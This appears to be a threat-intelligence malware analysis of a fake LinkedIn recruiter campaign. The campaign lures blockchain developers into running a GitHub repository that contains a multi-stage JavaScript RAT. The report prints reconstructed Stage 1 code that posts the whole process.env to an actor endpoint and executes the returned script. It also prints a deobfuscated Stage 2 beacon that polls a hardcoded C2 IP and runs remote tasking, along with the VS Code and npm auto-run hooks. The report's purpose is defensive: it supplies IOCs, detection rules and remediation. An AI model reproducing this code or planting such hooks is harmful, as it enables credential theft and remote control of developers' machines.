---
title: "Japanese-Royal: Environment Harvesting and JavaScript RAT Delivered via Fake Developer Interview"
date: 2026-02-25
author: "ThreatProphet"
description: "Analysis of a fake recruiter campaign targeting blockchain developers via LinkedIn, delivering a multi-stage JavaScript RAT through a malicious GitHub repository with four distinct execution triggers."
tags:
  - contagious-interview
  - javascript
  - rat
  - linkedin-lure
  - node-js
  - vscode
  - environment-harvesting
  - vercel
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1059.007
  - T1071.001
  - T1027
  - T1552.001
  - T1119
report_id: "TP-2026-002"
showToc: true
---

> *"He came as a messenger with gifts, and the birds grew fat."*

## Executive Summary

A threat actor operating a fake recruiter persona on LinkedIn approached developers with a CTO-level opportunity at a fabricated Japanese e-commerce company. After establishing credibility through a polished project brief, the actor shared a GitHub repository named **Japanese-Royal** as part of a technical interview, directing the target to review and run the codebase. The repository contained a multi-stage implant with four independent execution triggers, any one of which was sufficient to compromise the victim.

The campaign's most operationally notable characteristic is its credential harvesting gate. Before delivering a Stage 2 beacon payload, Stage 1 POSTs the victim's complete `process.env` snapshot to an actor-controlled Vercel endpoint. This snapshot includes the actor's own planted variables from `frontend/.env` and `frontend/.env.local`, as well as any real credentials the victim has loaded into their environment - AWS keys, API tokens, database strings, or any other secrets present at runtime. The Stage 1 endpoint applies selective gating confirmed through direct testing: the gate condition is satisfied by the combined presence of variables from both planted files. A request without those values returns a benign decoy response. This means payload delivery does not require a victim to have real credentials - any developer who runs the repository will receive the Stage 2 loader, since dotenv loads the planted files automatically. Any real credentials in the victim's environment are exfiltrated as a side effect. The actor profits from the intrusion even if the victim terminates the process before Stage 2 establishes persistence - the environment snapshot is exfiltrated before any payload is requested.

Once active, the Stage 2 implant fingerprints the host and beacons every five seconds to a hardcoded C2 server, awaiting arbitrary JavaScript tasking. A second repository under the same GitHub account - **Betfin** - was identified sharing the identical implant structure, a separate but structurally equivalent Stage 1 endpoint, and byte-for-byte identical `.env.local` bait secrets, confirming an active multi-lure campaign.

TTPs are consistent with **Lazarus Group / Contagious Interview** activity documented since 2023, though attribution is assessed at **low-to-medium confidence** based on TTP overlap alone.

---

## Attack Overview

### Initial Contact

The actor contacted the target on LinkedIn under the persona "Yorka Morales M.", posing as a recruiter for a company called Commerce Media Inc. The opening message referenced the target's blockchain technology background and management experience, offering a remote CTO or senior advisory role. To establish legitimacy, the message included a link to a Google Docs project brief describing the company, its e-commerce platform, and open positions with compensation figures ranging from $100K to $280K annually.

The Google Docs document was well-constructed. It presented Commerce Media Inc. as a Japan-based technology company with offices across Europe, Asia, and America, specializing in crypto-enabled e-commerce. It described an in-progress platform named Japanese-Royal with plans for cryptocurrency payment integration, wallet support, and a native platform token. The document included a fabricated company branding header, a staffing table, and a section describing a retiring CTO whose replacement was actively being sought. No link to any repository appeared in the document - it functioned solely as a social engineering prop to make the subsequent interview request credible.

The GitHub repository was shared separately during the interview conversation, presented as the codebase the candidate would be assessed on.

### Repository Cluster

Five repositories were identified across three GitHub accounts, all containing the same malicious implant pattern or sharing lure themes with the primary repository:

| GitHub Account | Repository | Notes |
|---|---|---|
| `0xroaman-1` | `Japanese-Royal` | Primary lure repository, subject of this report |
| `0xroaman-1` | `Betfin` | Secondary lure, identical implant structure |
| `0xroaman-2` | `Royal` | Lure repository, same implant pattern |
| `0xroaman-2` | `Betfin` | Duplicate lure theme across accounts |
| `0xroaman-4` | `Betfin` | Empty at time of analysis - possibly cleaned up |

The "Betfin" lure theme appears across all three accounts. The "Royal" theme appears across `0xroaman-1` (as Japanese-Royal) and `0xroaman-2`, suggesting deliberate theme reuse. Deploying identical lures across multiple accounts provides redundancy - if one account is reported and suspended, the others remain active and continue targeting victims.

All repositories with commits share byte-for-byte identical `.env.local` files (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`), confirming a common credential harvesting template reused across the full cluster.

### Campaign Timeline

| Date | Event |
|---|---|
| 2026-01-14 | `commerce-media[.]org` registered via Hostinger |
| 2026-01-19 | `commerce-media[.]org` updated - likely MX record configuration for operator email |
| 2026-01-23 | `0xroaman-1/Betfin` committed by `0xroaman-6` (+0200) |
| 2026-01-24 | `0xroaman-1/Japanese-Royal` committed by `0xroaman-6` (+0200) |
| 2026-01-30 | `0xroaman-4/Royal` committed by `0xbuild-02` (+0200) |
| 2026-02-04 | `0xroaman-2/Betfin` and `0xroaman-2/Royal` committed by `0xroaman-2` / `luis@commerce-media[.]org` (+0100) |
| 2026-02-25 | Analysis conducted, C2 active in standby state |

The domain registration on 2026-01-14 predates the first repository commit by eleven days, and the 2026-01-19 update precedes commits by four days. This sequence is consistent with the operator establishing email infrastructure under the fake company identity before building the lure repositories.

### Kill Chain

1. Actor contacts target on LinkedIn with a CTO recruitment pitch and shares a Google Docs project brief for a fabricated company to establish credibility.
2. During the interview, the actor shares the `0xroaman-1/Japanese-Royal` GitHub repository as a technical assessment.
3. Victim is compromised through any one of four independent execution triggers (detailed below). No single specific action is required - `npm install`, `npm start`, opening the folder in VS Code, or running any npm lifecycle script is sufficient.
4. On execution, `api/auth.js` loads and calls `validateApiKey()` at module level, initiating Stage 1.
5. Stage 1 (`controllers/auth.js`) decodes the Stage 1 endpoint from Base64 stored in `frontend/.env`, then POSTs the victim's complete `process.env` to the endpoint - exfiltrating all runtime secrets including any `.env`-loaded credentials.
6. The Stage 1 endpoint checks for the combined presence of variables from the actor's planted `frontend/.env` and `frontend/.env.local`. If the gate is satisfied, it returns JavaScript which is executed immediately via `new Function('require', response.data)(require)`, granting full Node.js runtime access.
7. The returned Stage 2 payload fingerprints the host (hostname, MAC addresses, OS) and begins beaconing to `hxxp://174.138.188[.]80:3000/api/errorMessage` via HTTP GET every five seconds.
8. The C2 responds with `{"status":"ok","message":"server connected"}` in standby state. When tasking is active, a response with `status: "error"` causes the `message` field to be executed as arbitrary JavaScript.

---

## Technical Analysis

### Execution Triggers

The repository implements four independent paths to execution, making it unusually resilient against partial defenses. A developer who disables VS Code automatic tasks but runs `npm install` is still compromised. A developer who reviews `tasks.json` and avoids opening the project in VS Code but runs `npm start` is still compromised. All four triggers ultimately execute `server/server.js`, which loads the malicious route module and fires Stage 1.

**Trigger 1 - VS Code folder open (`tasks.json`)**

`.vscode/tasks.json` defines two chained tasks configured with `runOptions.runOn: "folderOpen"`. Opening the repository folder in VS Code causes both to execute automatically without any user prompt.

```json
{
  "label": "frontend-nextjs-dev",
  "type": "shell",
  "command": "npm run dev",
  "options": {
    "cwd": "${workspaceFolder}/frontend"
  },
  "dependsOn": "frontend-npm-install",
  "dependsOrder": "sequence",
  "runOptions": {
    "runOn": "folderOpen"
  },
}
```

**Trigger 2 - `npm start`**

`frontend/package.json` defines the `start` script as:

```json
"start": "node server/server.js | next dev"
```

The pipe operator causes both processes to run simultaneously. The malicious `server/server.js` starts regardless of whether `next dev` succeeds, and any failure of `next dev` does not terminate the implant.

**Trigger 3 - `npm install` (prepare hook)**

```json
"prepare": "node server/server.js | next dev"
```

The `prepare` lifecycle hook fires automatically during `npm install`, before the install completes. Running `npm install` inside `frontend/` - including when triggered automatically by the VS Code task - starts `server/server.js`, loads the malicious route module, and executes Stage 1 in full: environment exfiltration and loader delivery both occur. A developer running `npm install` to audit dependencies before doing anything else is fully compromised before the install finishes.

**Trigger 4 - Direct execution**

Any explicit invocation of `node server/server.js` or `npm run dev` (which chains through the server entry point) triggers Stage 1.

### Stage 1: Environment Exfiltration and Loader Delivery

The Stage 1 logic is split across two files. `frontend/server/routes/api/auth.js` calls `validateApiKey()` as a top-level module assignment, meaning Stage 1 fires at import time - during server startup - without any HTTP request being required:

```javascript
// frontend/server/routes/api/auth.js
const verified = validateApiKey(); // executes at module load, not on request
```

`frontend/server/controllers/auth.js` implements the exfiltration and loader:

```javascript
// frontend/server/controllers/auth.js (reconstructed)
const s = (str) => atob(str); // Base64 decode helper

async function validateApiKey() {
  const api = s(process.env.AUTH_API); // decode endpoint from .env
  try {
    const response = await axios.post(
      api,
      { ...process.env },              // exfiltrate full environment
      { headers: { 'x-app-request': 'ip-check' } }
    );
    const executor = new Function('require', response.data);
    executor(require);                 // execute returned JavaScript
  } catch (e) {}
}
```

`frontend/.env` contains the Base64-encoded Stage 1 endpoint:

```
AUTH_API=<base64>   # decodes to: https://ip-check-notification-firebase.vercel[.]app/api
```

The same file contains numerous variables designed to resemble real developer secrets - AWS access keys, Stripe keys, OpenAI API keys, Infura project credentials, and session secrets. These planted variables satisfy the Stage 1 gate condition and will be present in any victim's `process.env` snapshot. Any additional real credentials the victim has loaded into their environment are exfiltrated alongside them.

**Stage 1 selective gating:** The endpoint's gating behavior was confirmed through direct testing. The gate condition is satisfied by the combined presence of variables from both `frontend/.env` and `frontend/.env.local` - the two configuration files planted by the actor in the repository. A request containing only generic environment variables returns the benign decoy response. A request containing the values from both planted files returns the loader payload.

This means the gate is not screening for a victim's real credentials - it is screening for evidence that the victim's Node.js process loaded the actor's own planted files. Any developer who clones the repository and runs it in a completely clean environment with no real secrets will still receive the Stage 2 payload, provided dotenv loaded `.env` and `.env.local` as intended. The bait secrets in those files serve a dual function: they make the exfiltrated environment snapshot appear valuable for credential theft, and they act as the unlock condition for payload delivery.

The decoy response returned to requests that do not satisfy the gate:

```json
{
  "status": "OK",
  "message": "Public API response",
  "client": {
    "ipAddress": "...",
    "vpnDetected": false,
    "note": "Connection appears normal."
  }
}
```

This cover response serves as both a researcher deterrent and a plausible decoy if the victim inspects outbound network traffic.

### Stage 2: Host Fingerprinting and C2 Beacon

The Stage 2 payload delivered by the Stage 1 endpoint is an obfuscated JavaScript beacon. The obfuscation uses a rotating string array with an integrity self-check based on `Function.prototype.toString` and a ReDoS-pattern string (`(((.+)+)+)+$`) used as an identity fingerprint to detect instrumented environments. The deobfuscated logic is as follows:

```javascript
// Stage 2 - deobfuscated and annotated
const axios = require('axios');
const os    = require('os');

let instanceId = 0;

async function beacon() {
  try {
    const sysInfo = {
      hostname : os.hostname(),
      macs     : Object.values(os.networkInterfaces())
                   .flat()
                   .filter(Boolean)
                   .map(m => m.mac)
                   .filter(m => m && '00:00:00:00:00:00' !== m), // exclude null MACs
      os       : os.platform() + ' ' + os.release() + ' (' + os.type() + ')'
    };

    const response = await axios.get(
      'http://174.138.188.80:3000/api/errorMessage',
      {
        params: {
          sysInfo     : sysInfo,
          exceptionId : 'env070722',   // hardcoded campaign marker
          instanceId  : instanceId
        }
      }
    );

    if ('error' === response.data.status) {
      // C2 returned tasking - execute it
      const task = response.data.message || 'Unknown error';
      new Function('require', task)(require);
    } else if (response.data.instanceId) {
      // C2 assigned a session identifier - store for future beacons
      instanceId = response.data.instanceId;
    }

  } catch (e) {}
}

beacon();
setInterval(beacon, 5000); // beacon every 5 seconds
```

The campaign marker `exceptionId=env070722` is hardcoded. The `0722` suffix follows the same format observed in TP-2026-001, where the campaign marker was `env991228`. These suffixes may represent campaign dates in MMDD format (July 22 and December 28 respectively), operator identifiers, or version markers. The relationship between these values is unconfirmed.

### Stage 3: C2 Tasking

At the time of analysis, the C2 at `174.138.188[.]80:3000` returned an idle response to all queries regardless of parameters:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{"status":"ok","message":"server connected"}
```

The identical `ETag` value (`W/"2c-C+DUpHd4h+gH5EGTBj3pzaIUfSY"`) was returned for requests both with and without `sysInfo`/`exceptionId` parameters, confirming a static response at time of capture. This is consistent with tasking being disabled or rotated following exposure, or with additional server-side gating on `instanceId` or source IP that was not satisfied by the analysis requests. The C2 infrastructure is Express.js-based, running on TCP/3000 over plain HTTP.

When active, the C2 delivers arbitrary JavaScript to the beacon via the `message` field under a `status: "error"` response. This payload is executed via the same `new Function('require', payload)(require)` primitive, providing full Node.js runtime access including filesystem operations, process execution, and network activity.

### Betfin: Corroborating Repository

The second repository under `0xroaman-1`, **Betfin**, implements the identical implant pattern. Key structural elements are consistent across both repositories:

- `AUTH_API` Base64-encoded in `.env`, decoding to a distinct but structurally identical Stage 1 endpoint: `hxxps://ip-checking-notification-pic.vercel[.]app/api`
- Same `validateApiKey()` module-load execution pattern in `routes/api/auth.js`
- Same `new Function('require', response.data)(require)` loader in `controllers/auth.js`
- Byte-for-byte identical `.env.local` (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`) confirming a shared credential harvesting template
- Same `package.json` trigger scripts

The Betfin Stage 1 endpoint subdomain follows the same naming convention as the Japanese-Royal endpoint: both match the pattern `ip-check[ing]-notification-[suffix].vercel.app`. The use of separate endpoints per repository suggests per-lure infrastructure isolation, either for operational security or to allow independent targeting of different victim pools.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment lure with Google Docs project brief |
| T1059.007 | JavaScript | Execution | `new Function('require', payload)(require)` at all stages |
| T1071.001 | Web Protocols | C2 | Plain HTTP GET beacon to port 3000 every 5 seconds |
| T1027 | Obfuscated Files or Information | Defense Evasion | Rotating string array obfuscation, Base64-encoded endpoint in `.env` |
| T1552.001 | Credentials in Files | Credential Access | `process.env` exfiltration including `.env`-loaded secrets |
| T1119 | Automated Collection | Collection | Full environment snapshot POSTed to Stage 1 endpoint on execution |

---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `174.138.188[.]80` | IPv4 | Stage 2/3 C2 server, TCP/3000, Express.js |
| `174.138.188[.]80:3000/api/errorMessage` | URL | Beacon endpoint, active at time of analysis |
| `ip-check-notification-firebase.vercel[.]app` | Domain | Stage 1 endpoint, Japanese-Royal |
| `ip-check-notification-firebase.vercel[.]app/api` | URL | Exfiltration and loader delivery path |
| `ip-checking-notification-pic.vercel[.]app` | Domain | Stage 1 endpoint, Betfin |
| `ip-checking-notification-pic.vercel[.]app/api` | URL | Exfiltration and loader delivery path |

Both Stage 1 domains are Vercel-hosted and follow the naming convention `ip-check[ing]-notification-[suffix].vercel.app`. This pattern overlaps with Vercel-hosted delivery domains documented in TP-2026-001, which also used Vercel for Stage 1 infrastructure across multiple repository variants.

**C2 server details:**

| Field | Value |
|---|---|
| IP | `174.138.188[.]80` |
| Port | TCP/3000 |
| Server | Express.js (`X-Powered-By: Express`) |
| Protocol | HTTP (plaintext) |
| Status at analysis | Active, idle response |

### Operator Domain Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `commerce-media[.]org` | Domain | Registered 2026-01-14, Hostinger, parked - no live web content |
| `84.32.84[.]32` | IPv4 | Hostinger shared parking IP, no co-hosted campaign infrastructure identified |
| `luis@commerce-media[.]org` | Email | Git author identity for `0xroaman-2` commits, domain matches lure company name |

The domain `commerce-media[.]org` was registered eleven days before the first repository commit, with a DNS update five days later consistent with MX record configuration. The domain name directly matches the fake company identity ("Commerce Media Inc.") used in the Google Docs lure document, confirming it was purpose-built for this campaign. The operator registered a custom email domain rather than using a free provider for at least one Git identity, representing a deliberate operational preparation step.

### Operator Identity

Three distinct Git author identities were recovered from commit history across the repository cluster. In all cases the GitHub hosting account name differs from the Git author name configured in commits - a consistent pattern of identity separation between account creation and code development.

| Git Author Name | Git Author Email | Timezone | Repos | Notes |
|---|---|---|---|---|
| `0xroaman-6` | `0xsoftbuild+3@gmail.com` | +0200 | `0xroaman-1/Japanese-Royal`, `0xroaman-1/Betfin` | Primary operator identity |
| `0xbuild-02` | `victoriaknowles903+2@gmail.com` | +0200 | `0xroaman-4/Royal` | Secondary identity, same timezone |
| `0xroaman-2` | `luis@commerce-media[.]org` | +0100 | `0xroaman-2/Royal`, `0xroaman-2/Betfin` | Custom domain email, +0100 timezone |

Both Gmail addresses use plus-addressing with numeric tags: `0xsoftbuild+3` and `victoriaknowles903+2`. This convention allows a single Gmail inbox to receive mail for multiple tagged addresses, and is consistent with per-account or per-campaign email management from a shared base identity.

The `+0200` timezone is consistent across two of the three identities covering four of the five repositories, and across a seven-day commit window (2026-01-23 to 2026-01-30). The third identity (`luis@commerce-media[.]org`) commits at `+0100`. This offset difference may reflect a second operator, a VPN exit node change, or the primary operator in a different timezone during the February commits.

The base name behind `victoriaknowles903@gmail.com` - "Victoria Knowles" - follows the pattern of a plausible Western female recruiter persona, consistent with the LinkedIn contact persona "Yorka Morales M." used to approach the target.

### Repository Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `github.com/0xroaman-1` | GitHub Account | Hosts Japanese-Royal and Betfin |
| `github.com/0xroaman-2` | GitHub Account | Hosts Royal and Betfin |
| `github.com/0xroaman-4` | GitHub Account | Hosts empty Betfin repo |
| `github.com/0xroaman-1/Japanese-Royal` | Repository | Primary lure |
| `github.com/0xroaman-1/Betfin` | Repository | Secondary lure |
| `github.com/0xroaman-2/Royal` | Repository | Lure, same implant pattern |
| `github.com/0xroaman-2/Betfin` | Repository | Lure, duplicate theme |
| `github.com/0xroaman-4/Betfin` | Repository | Empty at time of analysis |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Confidence |
|---|---|---|
| `174.138.188[.]80` | IPv4 | High |
| `174.138.188[.]80:3000` | IP:Port | High |
| `/api/errorMessage?exceptionId=env070722` | URL pattern | High |
| `ip-check-notification-firebase.vercel[.]app` | Domain | High |
| `ip-checking-notification-pic.vercel[.]app` | Domain | High |
| `commerce-media[.]org` | Domain | High |
| `84.32.84[.]32` | IPv4 | Medium - Hostinger shared parking, low specificity |

### Operator Identity Indicators

| Indicator | Type | Notes |
|---|---|---|
| `0xsoftbuild+3@gmail.com` | Email | Git author email, `0xroaman-1` repos, base: `0xsoftbuild@gmail.com` |
| `victoriaknowles903+2@gmail.com` | Email | Git author email, `0xroaman-4` repos, base: `victoriaknowles903@gmail.com` |
| `luis@commerce-media[.]org` | Email | Git author email, `0xroaman-2` repos |
| `commerce-media[.]org` | Domain | Registered 2026-01-14, Hostinger, matches lure company name |
| `0xroaman-6` | Git author name | Commits to `0xroaman-1` repos |
| `0xbuild-02` | Git author name | Commits to `0xroaman-4` repos |
| Commit timezone `+0200` | Pattern | Primary across four of five repos |

### Repository and Code Indicators

| Indicator | Type | Notes |
|---|---|---|
| `github.com/0xroaman-1/Japanese-Royal` | Repository | Primary lure repository |
| `github.com/0xroaman-1/Betfin` | Repository | Secondary lure |
| `github.com/0xroaman-2/Royal` | Repository | Lure, same implant pattern |
| `github.com/0xroaman-2/Betfin` | Repository | Lure, duplicate theme |
| `github.com/0xroaman-4/Betfin` | Repository | Empty at time of analysis |
| `0xroaman-1` | GitHub account | Confirmed operator account |
| `0xroaman-2` | GitHub account | Confirmed operator account |
| `0xroaman-4` | GitHub account | Confirmed operator account |
| `runOn: folderOpen` in `.vscode/tasks.json` | Code pattern | VS Code auto-execution trigger |
| `new Function('require', response.data)(require)` | Code pattern | Dynamic execution primitive, all stages |
| `{ ...process.env }` POST to decoded URL | Code pattern | Environment exfiltration |
| `x-app-request: ip-check` | HTTP header | Stage 1 request identifier |
| `exceptionId=env070722` | Beacon parameter | Hardcoded campaign marker |
| Beacon interval `0x1388` (5000ms) | Code pattern | Stage 2 polling interval |

### File Indicators

| SHA256 | Filename | Notes |
|---|---|---|
| `48c6d172a43919df05ec9f506a1483e4c0fe820ea72092888d77b985aa7109c4` | `.vscode/tasks.json` | VS Code auto-execution config (Japanese-Royal) |
| `603f46ba670a4be0bcf23429015ab00ccef04dc278bffc2d855eb8de52f9e711` | `frontend/.env` | Contains Base64-encoded Stage 1 endpoint and bait secrets |
| `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | `frontend/.env.local` | Bait secrets - identical across Japanese-Royal and Betfin |
| `865dd0484235a1bbe46241812e2bbdbe36101f1f8b3741aaecbfa819ae190167` | `frontend/server/controllers/auth.js` | Stage 1 exfiltration and loader logic |
| `280f0138f8eff29392c93d52d639c049849143d8628914d6e82949fd714ee939` | `frontend/server/routes/api/auth.js` | Module-load execution trigger |
| `9c7b96baaf461c9ca46db4472d5c65faec468b83db20ef1df25d6bde2bfa928d` | `frontend/package.json` | Contains `start` and `prepare` trigger scripts |
| `a25f293776496f991565b0b5e6103e3948fa99acf6f1d45482c794fd52023855` | `post-payload.txt` | Captured Stage 2 beacon payload (obfuscated) |
| `cc912c054e84000095b4e92fc8da36e4245eb6ad9d29dc1f102d05e566c90324` | `payload.js` | Stage 1 decoy response (benign) |
| `c49175c4e9d08fc6a242649815c716d0f445fb4229dbf22395fde99f25119a21` | `Betfin/.env` | Contains Base64-encoded Stage 1 endpoint (distinct from Japanese-Royal) |
| `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | `Betfin/.env.local` | Byte-for-byte identical to Japanese-Royal `.env.local` |
| `28e73ce85db813ba0839ee077428eaa121037e3a1ec8a13b1171e68cc2a0accd` | `Betfin/routes/api/auth.js` | Same execution trigger pattern |
| `cc9e443872d99b07e4bf5f6baa6144fbe0fd24bc610e58340d9b8c755df17fce` | `Betfin/controllers/auth.js` | Same exfiltration and loader logic |

---

## Attribution Assessment

**Assessed confidence: Low-to-Medium**

Several aspects of this campaign overlap with documented Lazarus Group developer-targeting operations, specifically the cluster tracked under the **Contagious Interview** moniker:

- LinkedIn recruitment lure targeting developers with blockchain and crypto experience - a defining characteristic of Contagious Interview campaigns active since at least 2023
- Fake technical interview with a GitHub-hosted malicious repository presented as a coding assessment
- Crypto and Web3 project theming consistent with Lazarus Group's known focus on cryptocurrency-adjacent targets
- `.vscode/tasks.json` `runOn: folderOpen` auto-execution trigger, a technique documented in multiple prior Contagious Interview variants
- `new Function('require', payload)(require)` execution primitive - functionally identical to the Stage 2 payload documented in TP-2026-001 and to InvisibleFerret variants reported by Unit42
- Plain HTTP beacon on TCP/3000 with host fingerprinting (hostname, MACs, OS) and a hardcoded `exceptionId` campaign marker - structural match to TP-2026-001 Stage 2 behavior
- Vercel-hosted Stage 1 infrastructure consistent with delivery patterns across multiple prior Contagious Interview repositories

This campaign differs from TP-2026-001 in several respects. Payload staging via Binance Smart Chain smart contract - the technically distinctive element of TP-2026-001 - is absent here. Stage 1 uses a simpler HTTP POST to a Vercel endpoint with environment exfiltration as a primary objective, treating credential harvesting as a goal in its own right rather than incidental to loader delivery. The C2 IP address differs (`174.138.188[.]80` vs `163.245.194[.]216`), and the operator GitHub accounts are distinct. The campaign marker suffixes (`0722` vs `1228`) may reflect different sub-campaigns, operator rotation, or independent actors using shared tooling.

The Stage 2 payload code - including its obfuscation style, string rotation pattern, and beacon structure - is sufficiently similar to the TP-2026-001 `env-setup.js` variant to suggest either the same tooling author or a common toolkit shared across operators within the same group.

The operator identity findings are partially inconsistent with Lazarus Group's documented operational security posture. The registration of `commerce-media[.]org` under a registrar that retains identifiable metadata, the reuse of Gmail plus-addressing across multiple accounts (`0xsoftbuild+3`, `victoriaknowles903+2`), and the consistent `+0200` timezone offset across commits are indicators more consistent with a less disciplined actor than nation-state operators typically demonstrate. The domain registration on 2026-01-14 - predating the first repository commit by eleven days - does indicate deliberate pre-campaign infrastructure planning, but this level of preparation is not exclusive to state-sponsored actors. These factors do not exclude Lazarus Group attribution but reduce confidence in that specific assessment.

These similarities do not constitute confirmed attribution. The techniques described are well-documented and could be replicated by actors familiar with prior Contagious Interview reporting. Attribution should not be asserted without additional corroborating intelligence.

**Prior reporting:**
- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [CISA - TraderTraitor](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a)
- [ThreatProphet TP-2026-001 - Interview Trap](https://threatprophet.com/posts/2026-02-24-interview-trap/)

---

## Remediation

### If You Ran the Repository

Treat this as a confirmed credential compromise regardless of how briefly the code ran. Stage 1 exfiltrates `process.env` synchronously on startup - the leak occurs before any visible output.

- Isolate the affected machine from the network immediately
- Rotate all credentials that may have been present in the environment: AWS access keys, API tokens, database connection strings, private keys, OAuth secrets, and any variables loaded from `.env` or `.env.local` files
- Audit cloud provider access logs for anomalous API calls in the period following execution - credential use may have begun within seconds
- Check for persistence mechanisms: cron jobs, `launchd` agents (macOS), systemd units, registry Run keys (Windows), and any new files in `~/.vscode/` or home directory subdirectories
- Do not rely on AV or EDR detection - the payload executes as JavaScript inside a legitimate `node` process and will not match known malware signatures
- Review browser-stored credentials and session tokens if the compromised machine was used for authenticated sessions after execution
- If any cryptocurrency wallet seed phrases or private keys were accessible from the environment, treat them as compromised and migrate funds immediately
- Reimage from a known-good backup or clean OS install once forensic preservation is complete

### Network-Level Detection

- Block and alert on outbound connections to `174.138.188[.]80` on all ports, especially TCP/3000
- Create IDS rules for HTTP GET requests matching `/api/errorMessage` with parameter `exceptionId=env070722`
- Alert on outbound HTTP plaintext connections originating from `node` processes on non-standard high ports
- Monitor for outbound POST requests to `*.vercel.app` paths ending in `/api` from Node.js processes, particularly with header `x-app-request: ip-check`

**Sigma rule (conceptual):**

```yaml
title: Contagious Interview C2 Beacon - env070722
status: experimental
logsource:
  category: network_connection
detection:
  selection:
    DestinationIp: '174.138.188.80'
    DestinationPort: 3000
  condition: selection
falsepositives:
  - None expected
level: critical
```

### Host-Level Hardening

- Set `task.allowAutomaticTasks` to `off` or `prompt` in VS Code user settings to prevent `runOn: folderOpen` tasks from executing silently
- Review `.vscode/tasks.json` before opening any unknown repository in VS Code; inspect specifically for `runOn: folderOpen` and any shell commands referencing remote URLs
- Audit `prepare`, `postinstall`, and `preinstall` scripts in `package.json` before running `npm install` in unfamiliar projects
- Run technical assessments from unknown sources inside an isolated VM or container with no access to host credentials, no mounted credential files, and filtered network egress
- Use a dedicated assessment environment with clean `.env` and `.env.local` files containing no real credentials and no variables matching the actor's planted files - this defeats the selective gating mechanism, since the Stage 1 endpoint requires the presence of variables from both planted files to return the loader payload. Substitute or omit the `INFURA_PROJECT_ID`, `INFURA_PROJECT_SECRET`, and `SESSION_SECRET` values specifically

---

## Appendix: Evidence Artifacts

| Artifact ID | Description | SHA256 |
|---|---|---|
| EX-001 | LinkedIn initial contact screenshot | `86c6976aa7da7020346c7bd8812d51fdd407ff27445b7fbf7095a90c8aba8e98` |
| EX-002 | Google Docs project brief screenshot | `7c023b91523050404d7461cac43113cf50fdb93b58fd0cf354a87322000fdb6b` |
| EX-003 | `.vscode/tasks.json` - VS Code auto-execution config | `48c6d172a43919df05ec9f506a1483e4c0fe820ea72092888d77b985aa7109c4` |
| EX-004 | `frontend/.env` - Base64 endpoint and bait secrets | `603f46ba670a4be0bcf23429015ab00ccef04dc278bffc2d855eb8de52f9e711` |
| EX-005 | `frontend/.env.local` - Additional bait secrets | `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` |
| EX-006 | `frontend/server/controllers/auth.js` - Stage 1 exfiltration and loader | `865dd0484235a1bbe46241812e2bbdbe36101f1f8b3741aaecbfa819ae190167` |
| EX-007 | `frontend/server/routes/api/auth.js` - Module-load trigger | `280f0138f8eff29392c93d52d639c049849143d8628914d6e82949fd714ee939` |
| EX-008 | `frontend/package.json` - `start` and `prepare` trigger scripts | `9c7b96baaf461c9ca46db4472d5c65faec468b83db20ef1df25d6bde2bfa928d` |
| EX-009 | Stage 2 beacon payload (obfuscated, captured) | `a25f293776496f991565b0b5e6103e3948fa99acf6f1d45482c794fd52023855` |
| EX-010 | Stage 1 decoy response (benign) | `cc912c054e84000095b4e92fc8da36e4245eb6ad9d29dc1f102d05e566c90324` |
| EX-011 | C2 response capture (2026-02-25) | `3c33f61d62e6b5632aa16326e672e85fa38ea04278c1db7b05f86c546cf18474` |
| EX-012 | `Betfin/.env` - Distinct Stage 1 endpoint, shared bait secret template | `c49175c4e9d08fc6a242649815c716d0f445fb4229dbf22395fde99f25119a21` |
| EX-013 | Japanese-Royal repository mirror archive | `c6bcb1d0ba766bc0da351fc137365b2762d9a5abda7a9d33a1363ed7056c7b7d` |
| EX-014 | Betfin repository mirror archive (`0xroaman-1`) | `faa267bd900faa3d19cd1d6fb31c78fb21b6b154210c79855fe36e5532826a3b` |
| EX-015 | `commerce-media[.]org` WHOIS record (2026-02-25) | `140703ff8bf1a8aca82feefc35934283623781179dcc1c8e4516a213f02fe79f` |
| EX-016 | `0xroaman-2/Betfin` repository mirror archive | `27ad64f93b1a3d0caca7fe7972788653daeb56f4e6e2f54d749c51ef98b92d80` |
| EX-017 | `0xroaman-2/Royal` repository mirror archive | `ff0bdd7180a0aec5fa8b64cc9d19e4da27ed2af1446e328dd9d93db06268442f` |

---

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-002 | Published: 2026-02-25 | Author: [ThreatProphet](https://threatprophet.com)*
